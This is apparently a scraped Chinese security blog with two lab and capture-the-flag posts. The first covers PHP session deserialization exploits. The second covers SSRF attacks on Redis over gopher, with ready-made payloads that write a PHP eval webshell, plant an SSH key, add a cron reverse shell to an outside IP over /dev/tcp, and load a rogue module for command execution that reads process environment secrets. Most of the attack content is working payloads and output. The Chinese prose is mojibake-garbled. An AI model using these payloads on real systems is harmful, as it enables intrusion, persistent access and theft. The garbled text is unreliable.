sessionçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨sessionçš„ååºåˆ—åŒ–æ¼æ´ï¼Œå°±æ˜¯åˆ©ç”¨phpå¤„ç†å™¨å’Œphp_serializeå¤„ç†å™¨çš„å­˜å‚¨æ ¼å¼å·®å¼‚è€Œäº§ç”Ÿï¼Œé€šè¿‡å…·ä½“çš„ä»£ç æˆ‘ä»¬æ¥çœ‹ä¸‹æ¼æ´å‡ºç°çš„åŸå›  å®éªŒä¸€åˆ›å»ºä¸€ä¸ªtest.phpï¼Œä½¿ç”¨php_serializeå¤„ç†å™¨ï¼› 123456789&lt;?phphighlight_file(__FILE__);ini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['zixyd'] = $_GET['zixyd'];echo $_SESSION['zixyd'];?&gt; åˆ›å»ºä¸€ä¸ªshell.phpï¼Œé»˜è®¤ä½¿ç”¨phpå¤„ç†å™¨ 123456789101112131415&lt;?phphighlight_file(__FILE__); session_start();class shell{ public $name; function __wakeup(){ echo &quot;success&quot;; } function __destruct(){ eval($this-&gt;name); }}$test = new shell();?&gt; 123456789&lt;?phpclass shell{ public $name;}$a = new shell();$a-&gt;name = &quot;phpinfo();&quot;;echo serialize($a);?&gt;//O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;} å°†|O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}urlç¼–ç ï¼›è®¿é—®test.phpï¼›å°†æ¶æ„æ•°æ®å­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ 1http://192.168.6.98/test.php?zixyd=%7CO%3A5%3A%22shell%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A10%3A%22phpinfo()%3B%22%3B%7D 123â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# cat sess_6bf6o57tcu6h8735crmc0845e1a:1:{s:5:&quot;zixyd&quot;;s:46:&quot;|O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}&quot;;} å¯ä»¥çœ‹åˆ°æ¶æ„æ•°æ®å·²ç»æˆåŠŸå­˜å‚¨åˆ°äº†sessionæ–‡ä»¶ï¼Œç›´æ¥è®¿é—®shell.phpå³å¯æ‰§è¡Œphpinfo phpå¤„ç†å™¨ä¼šä»¥|ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå°†O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}ååºåˆ—åŒ–ï¼Œå°±ä¼šè§¦å‘__wakeup()æ–¹æ³•ï¼Œæœ€åå¯¹è±¡é”€æ¯æ‰§è¡Œ__destruct()æ–¹æ³•ä¸­çš„eval()å‡½æ•° å®éªŒäºŒåˆ›å»ºä¸€ä¸ªtest2.phpæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425&lt;?phpini_set('session.serialize_handler', 'php');session_start();class zixyd{ public $mdzz; function __construct() { $this-&gt;mdzz = 'phpinfo();'; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET['phpinfo'])){ $m = new zixyd();}else{ highlight_file(__FILE__);}?&gt; æŸ¥çœ‹phpinfo 1http://web.jarvisoj.com:32784/index.php?phpinfo=1 ä»phpinfoä¸­å¯»æ‰¾é‡è¦ä¿¡æ¯å¦‚ä¸‹ï¼š Directive Local Value Master Value session.auto_start Off Off session.save_path /var/lib/php/sessions /var/lib/php/sessions session.serialize_handler php php_serialize session.upload_progress.enabled on on session.upload_progress.cleanup Off Off session.upload_progress.name PHP_SESSION_UPLOAD_PROGRESS PHP_SESSION_UPLOAD_PROGRESS session.upload_progress.prefix upload_progress_ upload_progress_ session.use_strict_mode Off Off å¯è§php.iniä¸­session.serialize_handler = php_serializeï¼Œå½“å‰ç›®å½•ä¸­è¢«è®¾ç½®ä¸ºsession.serialize_handler = phpï¼Œå› æ­¤å­˜åœ¨sessionååºåˆ—åŒ–åˆ©ç”¨çš„æ¡ä»¶ 12local value(å±€éƒ¨å˜é‡ï¼šä½œç”¨äºå½“å‰ç›®å½•ç¨‹åºï¼Œä¼šè¦†ç›–master valueå†…å®¹):phpmaster value(ä¸»å˜é‡ï¼šphp.inié‡Œé¢çš„å†…å®¹):php_serialize é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ‰¾åˆ°ä»£ç å…¥å£å°†åˆ©ç”¨ä»£ç å†™å…¥åˆ°sessionæ–‡ä»¶ï¼Ÿæƒ³è¦å†™å…¥sessionæ–‡ä»¶å°±å¾—æƒ³åŠæ³•åœ¨$_SESSIONå˜é‡ä¸­å¢åŠ æˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨session.upload_progress,å› ä¸ºè¿™æ ·çš„è¯session.upload_progress.name å’Œfilenameçš„å€¼éƒ½å¯æ§åˆ¶ï¼› 123456789101112&lt;?phpclass zixyd{ public $mdzz;}$a = new zixyd();$a-&gt;mdzz = 'system(&quot;id&quot;);';echo serialize($a);?&gt; //O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;} è¿˜æ˜¯åˆ©ç”¨é‚£ä¸ªæ–‡ä»¶ä¸Šä¼ çš„htmlæ–‡ä»¶ 123456789&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.6.98/test2.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; è¿™é‡Œæœ‰ä¸ªå¥‡æ€ªçš„ç‚¹å°±æ˜¯ï¼šæˆ‘å°†session.upload_progress.cleanup å…³äº†ï¼Œä½†ä¾ç„¶æ²¡æœ‰ç”¨ï¼Œæ–‡ä»¶ä¸Šä¼ çš„ä¿¡æ¯ä¾ç„¶æ²¡æœ‰ï¼Œæœ€ç»ˆè¿˜æ˜¯åˆ©ç”¨æ¡ä»¶ç«äº‰ |O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;}æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ª|ï¼Œè¿™é‡Œå¯ä»¥æŠŠpayloadæ”¾åˆ°session.upload_progress.name å’Œfilenameéƒ½æ˜¯å¯ä»¥çš„ 123456789101112131415161718192021222324POST /test2.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------8126225181410704334410916334Content-Length: 361Origin: nullConnection: closeCookie: PHPSESSID=ir85hm42ah4mln0ko3svp355ciUpgrade-Insecure-Requests: 1-----------------------------8126225181410704334410916334Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;Â§1Â§|O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;}-----------------------------8126225181410704334410916334Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.md&quot;Content-Type: application/octet-stream1-----------------------------8126225181410704334410916334-- 123456789101112GET /test2.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=ir85hm42ah4mln0ko3svp355ciUpgrade-Insecure-Requests: 1haha=Â§1Â§ success æœ€åæ”¾ä¸€å¼ æµç¨‹å›¾,è™½ç„¶å’Œæˆ‘åšçš„å®éªŒä¸ä¸€æ ·ï¼Œä½†æ˜¯æ„æ€å°±æ˜¯è¿™ä¸ªæ„æ€ï¼Œå‚è€ƒï¼šF4ke12138 session_decode1session_decode(string `$data`): bool session_decode() å¯¹ $data å‚æ•°ä¸­çš„å·²ç»åºåˆ—åŒ–çš„ä¼šè¯æ•°æ®è¿›è¡Œè§£ç ï¼Œ å¹¶ä¸”ä½¿ç”¨è§£ç åçš„æ•°æ®å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡ã€‚ è¯·æ³¨æ„ï¼Œè¿™é‡Œçš„ååºåˆ—åŒ–æ–¹æ³•ä¸åŒäº unserialize() å‡½æ•°ã€‚ åºåˆ—åŒ–æ–¹æ³•æ˜¯ PHP å†…ç½®çš„ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ session.serialize_handler é…ç½®é¡¹è¿›è¡Œä¿®æ”¹ã€‚ å®éªŒä¸€åˆ›å»ºä¸€ä¸ªsession.phpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718&lt;?php highlight_file(__FILE__);session_start(); $sessionData = $_POST['data'];session_decode($sessionData);var_dump($_SESSION);class zixyd{ public $a; public function __destruct(){ eval($this-&gt;a); }}?&gt; 1POST: data=username|s:5:&quot;zixyd&quot;; 123â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# cat sess_l177lcnaktemebo1dr0uq0c2omusername|s:5:&quot;zixyd&quot;; æˆåŠŸå°†username|s:5:&quot;zixyd&quot;; å†™å…¥åˆ°sessionæ–‡ä»¶ä¸­ï¼Œ å¦‚æœå†™å…¥çš„æ˜¯æ¶æ„æ•°æ®å‘¢ï¼Ÿ 1POST: data=shell|O:5:&quot;zixyd&quot;:1:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;} 123â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# cat sess_l177lcnaktemebo1dr0uq0c2omusername|s:5:&quot;zixyd&quot;;shell|O:5:&quot;zixyd&quot;:1:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;} æˆåŠŸæ‰§è¡Œphpinfo(); å¯ä»¥çœ‹åˆ°å½“session_decodeå‡½æ•°çš„å€¼æ˜¯å¯æ§æ—¶ï¼Œæ˜¯éå¸¸å±é™©çš„","link":"/2024/01/07/session%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/"},{"title":"ssrf(redis)","text":"å®éªŒç¯å¢ƒï¼škali+nginx+fpm; æå‰å®‰è£…redis(ä½äº7ç‰ˆæœ¬æ‰è¡Œï¼Œé«˜äº7çš„ç‰ˆæœ¬config set dirä¹‹ç±»ä¼šæŠ¥é”™)ï¼›å®‰è£…php_curlæ‰©å±•ï¼› å‘Webç›®å½•ä¸­å†™webshellåˆ›å»ºä¸€ä¸ªtest.php;å†…å®¹å¦‚ä¸‹ï¼Œ 123456789101112131415161718&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];if (preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url)){ $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); }else{ echo &quot;ssrf redis!&quot;; } ?&gt; payloadæˆ‘å·²ç»åˆ†ä¸ºäº†å››æ­¥ï¼›ä¿è¯å‰ä¸€æ­¥æ‰§è¡ŒæˆåŠŸ(ä¼šè¿”å›+OKä¹‹ç±»çš„å­—æ ·)åï¼›å†å»æ‰§è¡Œåä¸€æ­¥ï¼›(å¤±è´¥ä¼šè¿”å›â€ERRâ€œ) 1234config set dir /var/www/htmlquitgopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%250D%250Aquit 1234config set dbfilename shell.phpquitgopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dbfilename%2520shell.php%250D%250Aquit 1234set payload &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;quitgopher%3A%2F%2F127.0.0.1%3A6379%2F_set%2520payload%2520%2522%253C%253Fphp%2520eval(%255C%2524_POST%255B1%255D)%253B%253F%253E%2522%250D%250Aquit 1234savequitgopher%3A%2F%2F127.0.0.1%3A6379%2F_save%250D%250Aquit æ‰§è¡ŒæˆåŠŸåä¼šå‘ç°/var/www/htmlç›®å½•ä¸‹å·²ç»å­˜åœ¨äº†shell.phpï¼›åªä¸è¿‡é™¤äº†æˆ‘ä»¬çš„é”®å€¼&lt;?php eval($_POST[1]);?&gt;è¿˜æœ‰å…¶ä»–ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯è¿™å¹¶ä¸å½±å“phpè§£æï¼›ä½†æ˜¯è¿™æ ·ä¼šå½±å“ä¸‹ä¸€ä¸ªæ–¹æ³•(sshå†™å…¥å…¬é’¥ï¼›ä½†æ˜¯ä¹Ÿæœ‰åŠæ³•å¤„ç†è¿™ä¸ªé—®é¢˜)ï¼› 123cat shell.phpREDIS0006ï¿½payloadâ–’&lt;?php eval($_POST[1]);?&gt;abbbbbbbbbbï¿½&amp;@vï¿½ï¿½ï¿½ åˆ°è¿™é‡Œå®éªŒå°±ç»“æŸäº†ï¼Œä½†æ˜¯è¿™ä¸ªå®éªŒéœ€è¦æ³¨æ„æƒé™ç­‰é—®é¢˜ï¼›æ¯”å¦‚ï¼š 1ï¼Œæ˜¯å¦æœ‰æƒé™å‘/var/www/htmlæœ‰å†™æ–‡ä»¶çš„æ“ä½œï¼›(é»˜è®¤çš„diræ˜¯/var/lib/redis) 2ï¼Œå¦‚æœæœ‰æƒé™å†™å…¥webç›®å½•ï¼Œä¹Ÿè¦ä¿è¯æœåŠ¡å™¨æœ‰æƒé™å¯ä»¥è¯»æˆ‘ä»¬å†™å…¥çš„æ–‡ä»¶ï¼› è¡¥å……ï¼Œè¿™æ˜¯å°†ä¸Šé¢å››æ­¥åˆæˆäº†ä¸€æ­¥ï¼Œæ–¹ä¾¿æ‰“æ¯”èµ›çš„æ—¶å€™ç›´æ¥ç”¨ï¼›(åŒé‡urlç¼–ç äº†çš„) 1gopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%250D%250aconfig%2520set%2520dbfilename%2520shell.php%250D%250aset%2520payload%2520%2522%253C%253Fphp%2520eval(%255C%2524_POST%255B1%255D)%253B%253F%253E%2522%250D%250asave%250D%250aquit å†™å…¥sshå…¬é’¥è¿˜æ˜¯åˆ©ç”¨test.php åˆ¶ä½œå…¬ç§é’¥;ä¼šç”Ÿæˆåœ¨å½“å‰ç”¨æˆ·çš„~/.sshç›®å½•ä¸‹ 1ssh-keygen -t rsa payloadæˆ‘å·²ç»åˆ†ä¸ºäº†å››æ­¥ï¼›ä¿è¯å‰ä¸€æ­¥æ‰§è¡ŒæˆåŠŸ(ä¼šè¿”å›+OKä¹‹ç±»çš„å­—æ ·)åï¼›å†å»æ‰§è¡Œåä¸€æ­¥ï¼›(å¤±è´¥ä¼šè¿”å›â€ERRâ€œ) ç¬¬ä¸€æ­¥ç”¨æ¢è¡Œçš„æ–¹å¼ï¼Œä¿è¯å…¬é’¥ä¸ä¼šå—å…¶ä»–å­—ç¬¦å½±å“ 1234set publickey &quot;\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8GVS1wwIfWVDLGsoXHntxx5BaVrx1QrG5J7i3ZpoOf6HEz+ExYOEzUb0tGA6R477caXicuqhAGP4F6rLX9tyUaV7IHuZM2ZZJqo+8oVe1QCQlaUqjwgJAGpCcNnqWet/GFLfTJdDb57GgLLuA+ra5yDwkCuUzayB3We2cyUPqm2sbDIlIz0Nt3JLVNi9xa5SirFJ0iU2wzm+jsPT24/6jfvAbWWQHJTxNlglSogBSvNo6Cao3c9hbLxhmEiE1InNBOK8XBcAG739RZYRNKDOJLovvNiC2c47w5HrYAc7ge+eK1PM32bpVvNjBSNNrhkxnHiGCcHLOZnkxepKs3X0fmKzMxCRtCjr8YJEpbf8nSbMY1IxoSZz6RUnP4K/J6nfPt9NV8gog6lT2K5S71MNSvT96shVut0C8UDc+dQzv2tl6SzOy9rOeHhlBDqQEm0FKfP9EPucy4yLanULPIl4KqhexbHdz/uQ5UCUKR8Z/l3Vbmn2uM2Hs586O22EezNc= kali@kali\\n\\n\\n&quot;quitgopher%3A%2F%2F127.0.0.1%3A6379%2F_set%2520publickey%2520%2522%255Cn%255Cn%255Cnssh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQC8GVS1wwIfWVDLGsoXHntxx5BaVrx1QrG5J7i3ZpoOf6HEz%252BExYOEzUb0tGA6R477caXicuqhAGP4F6rLX9tyUaV7IHuZM2ZZJqo%252B8oVe1QCQlaUqjwgJAGpCcNnqWet%252FGFLfTJdDb57GgLLuA%252Bra5yDwkCuUzayB3We2cyUPqm2sbDIlIz0Nt3JLVNi9xa5SirFJ0iU2wzm%252BjsPT24%252F6jfvAbWWQHJTxNlglSogBSvNo6Cao3c9hbLxhmEiE1InNBOK8XBcAG739RZYRNKDOJLovvNiC2c47w5HrYAc7ge%252BeK1PM32bpVvNjBSNNrhkxnHiGCcHLOZnkxepKs3X0fmKzMxCRtCjr8YJEpbf8nSbMY1IxoSZz6RUnP4K%252FJ6nfPt9NV8gog6lT2K5S71MNSvT96shVut0C8UDc%252BdQzv2tl6SzOy9rOeHhlBDqQEm0FKfP9EPucy4yLanULPIl4KqhexbHdz%252FuQ5UCUKR8Z%252Fl3Vbmn2uM2Hs586O22EezNc%253D%2520kali%2540kali%255Cn%255Cn%255Cn%2522%250D%250Aquit è¿™é‡Œçš„ç›®å½•æ›´å…·æƒ…å†µè€Œå®šï¼Œåªæœ‰å¾€æŸä¸ªç”¨æˆ·çš„.sshç›®å½•æœ‰å†™çš„æƒé™å°±å¯ä»¥ï¼›å½“ç„¶è¦æ˜¯æœ‰rootæƒé™å°±æ›´å¥½äº†ï¼› 1234config set dir /home/kali/.ssh/quitgopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%252Fhome%252Fkali%252F.ssh%252F%250D%250Aquit è¿™æ˜¯sshçš„è§„å®šï¼Œå¿…é¡»ä¸ºauthorized_keysæ–‡ä»¶å 123config set dbfilename &quot;authorized_keys&quot;gopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dbfilename%2520%2522authorized_keys%2522%250D%250Aquit 1234savequitgopher%3A%2F%2F127.0.0.1%3A6379%2F_save%250D%250Aquit æœ€åç”¨sshè¿æ¥å³å¯ 1ssh -i id_rsa username@ip åˆ°è¿™é‡Œå®éªŒå°±ç»“æŸäº†ï¼Œä½†æ˜¯è¿™ä¸ªå®éªŒéœ€è¦æ³¨æ„æƒé™å’ŒæœåŠ¡ç­‰é—®é¢˜ï¼›æ¯”å¦‚ï¼š 1ï¼Œæ˜¯å¦æœ‰æƒé™å‘.sshæœ‰å†™æ–‡ä»¶çš„æ“ä½œï¼›æ³¨æ„è¿™é‡Œä¸ä¸€å®šéå¾—æ˜¯rootç”¨æˆ·ï¼›å¾€å¾€rootç”¨æˆ·çš„æƒé™æ²¡è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°ï¼›å¦‚æœèƒ½å¾€æ™®é€šç”¨æˆ·çš„.sshå†™å…¥ä¹Ÿæ˜¯å¯è¡Œçš„ï¼› 2ï¼Œéœ€è¦é¶æœºå¼€å¯sshæœåŠ¡ï¼Œå°±æ˜¯æ˜¯22ç«¯å£(å¯ä»¥ç”¨nmapæ¢æµ‹) å®šæ—¶ä»»åŠ¡è¿˜æ˜¯åˆ©ç”¨test.php æŸ¥çœ‹/var/spool/cronç›®å½•æƒé™ 1drwxr-xr-x 3 root root 4096 2023å¹´ 4æœˆ 5æ—¥ cron è¿™é‡Œçš„å®šæ—¶ä»»åŠ¡æ˜¯åœ¨/var/spool/cronç›®å½•ï¼Œè€Œä¸æ˜¯/etc/crontabæ–‡ä»¶ æ¥è‡ªgpt: /var/spool/cronç›®å½•é€šå¸¸ç”¨äºå­˜å‚¨ç”¨æˆ·ç‰¹å®šçš„å®šæ—¶ä»»åŠ¡ï¼ˆcron jobsï¼‰ã€‚åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªä»¥å…¶ç”¨æˆ·åå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºå­˜å‚¨è¯¥ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡ã€‚è¿™äº›æ–‡ä»¶åŒ…å«äº†ç”¨æˆ·è®¾ç½®çš„å®šæ—¶ä»»åŠ¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚ä½•æ—¶è¿è¡Œã€è¿è¡Œçš„å‘½ä»¤ç­‰ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸ç”±cronå®ˆæŠ¤è¿›ç¨‹è¯»å–ï¼Œå¹¶æŒ‰ç…§é¢„å®šçš„æ—¶é—´æ‰§è¡Œå…¶ä¸­å®šä¹‰çš„å‘½ä»¤ã€‚ å¤§æ¦‚å°±æ˜¯ä¸‹é¢å››æ­¥ï¼›ä½†æ˜¯è¿˜æ˜¯ç”¨å·¥å…·æ¥çš„å¿« 12345set cron &quot;\\n\\n* * * * * bash -i&gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave 1/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1' æˆ‘æ˜¯ç›´æ¥ç”¨çš„Gopheruså·¥å…· 1234567891011What do you want?? (ReverseShell/PHPShell): reverseshellGive your IP Address to connect with victim through Revershell (default is 127.0.0.1): 81.71.13.76What can be his Crontab Directory location## For debugging(locally) you can use /var/lib/redis : Your gopher link is ready to get Reverse Shell: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2466%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/81.71.13.76/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0ABefore sending request plz do `nc -lvp 1234` åˆ°è¿™é‡Œå®éªŒå°±ç»“æŸäº†ï¼Œä½†æ˜¯è¿™ä¸ªå®éªŒéœ€è¦æ³¨æ„æƒé™ç­‰é—®é¢˜ï¼›æ¯”å¦‚ï¼š 1ï¼Œéœ€è¦æœ‰æƒé™å¾€/var/spool/cronç›®å½•å†™æ–‡ä»¶ï¼Œè¿™é€šå¸¸åªç”¨ä»¥rootèº«ä»½è¿è¡Œredis-serveræ‰æœ‰å¸Œæœ›; 2ï¼Œå†™å…¥åçš„æ–‡ä»¶éœ€è¦æœ‰å¯æ‰§è¡Œæƒé™æ‰å¯ä»¥æ‰§è¡Œ(é€šå¸¸ä¸ä¼šæœ‰å¯æ‰§è¡Œæƒé™); 3, éœ€è¦é¶æœºå¯ä»¥å‡ºç½‘ï¼Œæ‰å¯ä»¥åå¼¹shell; ä¸»ä»å¤åˆ¶å¤§æ¦‚å°±æ˜¯è¿™å‡ æ¡å‘½ä»¤ 123456config set dir /tmp/config set dbfilename exp.soslaveof 81.71.13.76 6666module load /tmp/exp.sosystem.exec 'whoami'quit https://github.com/xmsec/redis-ssrfhttps://github.com/n0b0dyCN/redis-rogue-serverè¦è¿›è¡Œä¸»ä»å¤åˆ¶RCEï¼Œå°±éœ€è¦åˆ©ç”¨åˆ°è¿™ä¸¤ä¸ªå·¥å…·ï¼Œç¬¬ä¸€ä¸ªç”¨äºç”Ÿæˆpayloadï¼Œä¹Ÿå¯ä»¥å¯åŠ¨æ¶æ„æœåŠ¡ï¼Œç¬¬äºŒä¸ªä¸»è¦æ˜¯exp.soã€‚æ³¨æ„éœ€è¦å°†ç¬¬äºŒä¸ªå·¥å…·exp.soå¯¼å…¥åˆ°ç¬¬ä¸€ä¸ªå·¥å…·ä¸‹ï¼Œä¹Ÿå°±æ˜¯å’Œrogue-server.pyåŒç›®å½•ï¼Œè¿™é‡Œå…ˆå¼€å¯ä¸€ä¸‹rogue-server.py ç”¨äºä¼ªè£…ä¸ºä¸»redisï¼Œå®ƒå¼€å¯çš„ç«¯å£ä¸º6666 ç”±äºmoduleå‘½ä»¤æ˜¯åœ¨Redis 4.0åŠæ›´é«˜ç‰ˆæœ¬ä¸­å¼•å…¥çš„,è€Œæˆ‘æœ¬åœ°çš„redisç‰ˆæœ¬å¤ªä½ï¼Œå¹²è„†ç”¨æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ›ä¸­çš„ezezez_phpæ¥åšå®éªŒï¼› è®¿é—®é¶æœºï¼Œindex.phpå¦‚ä¸‹ï¼› 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;?phphighlight_file(__FILE__);include &quot;function.php&quot;;class Rd{ public $ending; public $cl; public $poc; public function __destruct() { echo &quot;All matters have concluded&quot;.&quot;&lt;/br&gt;&quot;; } public function __call($name, $arg) { foreach ($arg as $key =&gt; $value) { if ($arg[0]['POC'] == &quot;0.o&quot;) { $this-&gt;cl-&gt;var1 = &quot;get&quot;; } } }}class Poc{ public $payload; public $fun; public function __set($name, $value) { $this-&gt;payload = $name; $this-&gt;fun = $value; } function getflag($paylaod) { echo &quot;Have you genuinely accomplished what you set out to do?&quot;.&quot;&lt;/br&gt;&quot;; file_get_contents($paylaod); }}class Er{ public $symbol; public $Flag; public function __construct() { $this-&gt;symbol = True; } public function __set($name, $value) { if (preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',base64_decode($this-&gt;Flag))){ $value($this-&gt;Flag); } else { echo &quot;NoNoNo,please you can look hint.php&quot;.&quot;&lt;/br&gt;&quot;; } }}class Ha{ public $start; public $start1; public $start2; public function __construct() { echo $this-&gt;start1 . &quot;__construct&quot; . &quot;&lt;/br&gt;&quot;; } public function __destruct() { if ($this-&gt;start2 === &quot;o.0&quot;) { $this-&gt;start1-&gt;Love($this-&gt;start); echo &quot;You are Good!&quot;.&quot;&lt;/br&gt;&quot;; } }}function get($url) { $url=base64_decode($url); var_dump($url); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); var_dump($result_info); curl_close($ch); var_dump($output);}if (isset($_POST['pop'])) { $a = unserialize($_POST['pop']);} else { die(&quot;You are Silly goose!&quot;);}?&gt;You are Silly goose! 1Ha(__destruct) =&gt; Rd(__call) =&gt; Er(__set) =&gt; get($url) POC 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Rd{ public $ending; public $cl; public $poc;}class Er{ public $symbol; public $Flag;}class Ha{ public $start; public $start1; public $start2;}$a = new Ha;$a-&gt;start2 = &quot;o.0&quot;;$b = new Rd;$a-&gt;start1 = $b;$a-&gt;start= array( 'POC' =&gt; '0.o');$c = new Er;$b -&gt;cl = $c;$c-&gt;Flag = '';echo serialize($a); payloadæˆ‘å·²ç»åˆ†ä¸ºäº†å…­æ­¥ï¼›ä¿è¯å‰ä¸€æ­¥æ‰§è¡ŒæˆåŠŸ(ä¼šè¿”å›+OKä¹‹ç±»çš„å­—æ ·)åï¼›å†å»æ‰§è¡Œåä¸€æ­¥ï¼›(å¤±è´¥ä¼šè¿”å›â€ERRâ€œ) 123456config set dir /tmp/quitgopher://127.0.0.1:6379/_config%20set%20dir%20%2Ftmp%2F%0D%0AquitZ29waGVyOi8vMTI3LjAuMC4xOjYzNzkvX2NvbmZpZyUyMHNldCUyMGRpciUyMCUyRnRtcCUyRiUwRCUwQXF1aXQ= 1234config set dbfilename exp.soquitgopher://127.0.0.1:6379/_config%20set%20dbfilename%20exp.so%0D%0Aquit æ‰§è¡Œè¿™ä¸€æ­¥å‰ï¼Œéœ€è¦åœ¨vpsä¸Šæ‰§è¡Œpython2 rogue-server.pyå‘½ä»¤ 1234slaveof 81.71.13.76 6666quitgopher://127.0.0.1:6379/_slaveof%2081.71.13.76%206666%0D%0Aquit 1234module load /tmp/exp.soquitgopher://127.0.0.1:6379/_module%20load%20%2Ftmp%2Fexp.so%0D%0Aquit æ¥ä¸‹æ¥å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº† 1234system.exec 'cat /proc/self/environ'quitgopher://127.0.0.1:6379/_system.exec%20'cat%20%2Fproc%2Fself%2Fenviron'%0D%0Aquit 